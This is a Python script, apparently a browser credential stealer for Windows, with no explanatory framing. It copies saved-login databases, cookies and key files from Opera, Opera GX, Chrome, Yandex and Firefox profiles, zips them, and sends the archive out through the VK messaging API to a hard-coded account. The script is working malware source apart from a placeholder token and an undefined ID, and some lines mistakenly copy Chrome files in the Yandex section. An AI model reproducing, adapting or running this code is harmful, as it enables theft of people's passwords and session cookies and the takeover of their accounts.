from os import getlogin, path, mkdir, walk, listdir
from shutil import copy2
from zipfile import ZipFile
from random import randint
import vk_api
from vk_api import VkUpload
from vk_api.utils import get_random_id

username = getlogin()

roaming = f"C:\\Users\\{username}\\AppData\\Roaming"
local = f"C:\\Users\\{username}\\AppData\\Local"

number = randint(-345352353453, 42332345334512324)
mkdir(f"{roaming}\\logs{number}")
namefolder = f"logs{number}"

#opera
mkdir(f"{roaming}\\{namefolder}\\opera")
if path.exists(f"{roaming}\\Opera Software\\Opera Stable\\Login Data"):
    copy2(f"{roaming}\\Opera Software\\Opera Stable\\Login Data", rf'{roaming}\\{namefolder}\\opera')
if path.exists(f"{roaming}\\Opera Software\\Opera Stable\\Cookies"):
    copy2(f"{roaming}\\Opera Software\\Opera Stable\\Cookies", rf'{roaming}\\{namefolder}\\opera')
if path.exists(f"{roaming}\\Opera Software\\Opera Stable\\Local State"):
    copy2(f"{roaming}\\Opera Software\\Opera Stable\\Local State", rf'{roaming}\\{namefolder}\\opera')
#opera gx
mkdir(f"{roaming}\\{namefolder}\\opera gx")
if path.exists(f"{roaming}\\Opera Software\\Opera GX Stable\\Login Data"):
    copy2(f"{roaming}\\Opera Software\\Opera GX Stable\\Login Data", rf'{roaming}\\{namefolder}\\opera')
if path.exists(f"{roaming}\\Opera Software\\Opera GX Stable\\Cookies"):
    copy2(f"{roaming}\\Opera Software\\Opera GX Stable\\Cookies", rf'{roaming}\\{namefolder}\\opera')
if path.exists(f"{roaming}\\Opera Software\\Opera GX Stable\\Local State"):
    copy2(f"{roaming}\\Opera Software\\Opera GX Stable\\Local State", rf'{roaming}\\{namefolder}\\opera')
#chrome
mkdir(f"{roaming}\\{namefolder}\\chrome")
if path.exists(f"{local}\\Google\\Chrome\\User Data\\Default\\Login Data"):
    copy2(f"{local}\\Google\\Chrome\\User Data\\Default\\Login Data", rf'{roaming}\\{namefolder}\\chrome')
if path.exists(f"{local}\\Google\\Chrome\\User Data\\Default\\Cookies"):
    copy2(f"{local}\\Google\\Chrome\\User Data\\Default\\Cookies", rf'{roaming}\\{namefolder}\\chrome')
if path.exists(f"{local}\\Google\\Chrome\\User Data\\Local State"):
    copy2(f"{local}\\Google\\Chrome\\User Data\\Local State", rf'{roaming}\\{namefolder}\\chrome')
for i in range(1, 101):
    try:
        if path.exists(f"{local}\\Google\\Chrome\\User Data\\Profile {i}\\Login Data"):
            mkdir(f"{roaming}\\{namefolder}\\chrome\\Profile {i}")
            copy2(f"{local}\\Google\\Chrome\\User Data\\Profile {i}\\Login Data", rf'{roaming}\\{namefolder}\\chrome\\Profile {i}')
        if path.exists(f"{local}\\Google\\Chrome\\User Data\\Profile {i}\\Cookies"):
            copy2(f"{local}\\Google\\Chrome\\User Data\\Profile {i}\\Cookies", rf'{roaming}\\{namefolder}\\chrome\\Profile {i}')
        if path.exists(f"{local}\\Google\\Chrome\\User Data\\Profile {i}\\Local State"):
            copy2(f"{local}\\Google\\Chrome\\User Data\\Profile {i}\\Local State", rf'{roaming}\\{namefolder}\\chrome')
    except:
        break
#yandex
mkdir(f"{roaming}\\{namefolder}\\yandex")
if path.exists(f"{local}\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data"):
    copy2(f"{local}\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data", rf'{roaming}\\{namefolder}\\yandex')
if path.exists(f"{local}\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"):
    copy2(f"{local}\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies", rf'{roaming}\\{namefolder}\\yandex')
if path.exists(f"{local}\\Google\\Chrome\\User Data\\Local State"):
    copy2(f"{local}\\Google\\Chrome\\User Data\\Local State", rf'{roaming}\\{namefolder}\\chrome')
for i in range(1, 101):
    try:
        if path.exists(f"{local}\\Yandex\\YandexBrowser\\User Data\\Profile {i}\\Login Data"):
            mkdir(f"{roaming}\\{namefolder}\\yandex\\Profile {i}")
            copy2(f"{local}\\Yandex\\YandexBrowser\\User Data\\Profile {i}\\Login Data", rf'{roaming}\\{namefolder}\\yandex\\Profile {i}')
        if path.exists(f"{local}\\Yandex\\YandexBrowser\\User Data\\Profile {i}\\Cookies"):
            copy2(f"{local}\\Yandex\\YandexBrowser\\User Data\\Profile {i}\\Cookies", rf'{roaming}\\{namefolder}\\yandex\\Profile {i}')
            if path.exists(f"{local}\\Google\\Chrome\\User Data\\Profile {i}\\Local State"):
                copy2(f"{local}\\Google\\Chrome\\User Data\\Profile {i}\\Local State", rf'{roaming}\\{namefolder}\\chrome')
    except:
        break
#firefox
mkdir(f"{roaming}\\{namefolder}\\firefox")
for i in listdir(f"{roaming}\\Mozilla\\Firefox\\Profiles\\"):
    mkdir(f"{roaming}\\{namefolder}\\firefox\\{i}")
    if path.exists(f"{roaming}\\Mozilla\\Firefox\\Profiles\\{i}\\logins.json"):
        copy2(f"{roaming}\\Mozilla\\Firefox\\Profiles\\{i}\\logins.json", rf'{roaming}\\{namefolder}\\firefox\\{i}')
    if path.exists(f"{roaming}\\Mozilla\\Firefox\\Profiles\\{i}\\key3.db"):
        copy2(f"{roaming}\\Mozilla\\Firefox\\Profiles\\{i}\\key3.db", rf'{roaming}\\{namefolder}\\firefox\\{i}')
    if path.exists(f"{roaming}\\Mozilla\\Firefox\\Profiles\\{i}\\key4.db"):
        copy2(f"{roaming}\\Mozilla\\Firefox\\Profiles\\{i}\\key4.db", rf'{roaming}\\{namefolder}\\firefox\\{i}')
    if path.exists(f"{roaming}\\Mozilla\\Firefox\\Profiles\\{i}\\cert8.db"):
        copy2(f"{roaming}\\Mozilla\\Firefox\\Profiles\\{i}\\cert8.db", rf'{roaming}\\{namefolder}\\firefox\\{i}')
    if path.exists(f"{roaming}\\Mozilla\\Firefox\\Profiles\\{i}\\cookies.sqlite"):
        copy2(f"{roaming}\\Mozilla\\Firefox\\Profiles\\{i}\\cookies.sqlite", rf'{roaming}\\{namefolder}\\firefox\\{i}')



zip = ZipFile(f"{roaming}\\{namefolder}.zip", "w")

for root, dirs, files in walk(f"{roaming}\\{namefolder}"):
    for file in files:
        zip.write(path.join(root, file))
zip.close()
doc = f"{roaming}\\{namefolder}.zip"

vk_session = vk_api.VkApi(token='tokem')
vk = vk_session.get_api()

doc = VkUpload(vk).document_message(doc=doc, peer_id=your_id)
vk.messages.send(user_id=107442155, random_id=get_random_id(), message=str(doc['doc']['url']))
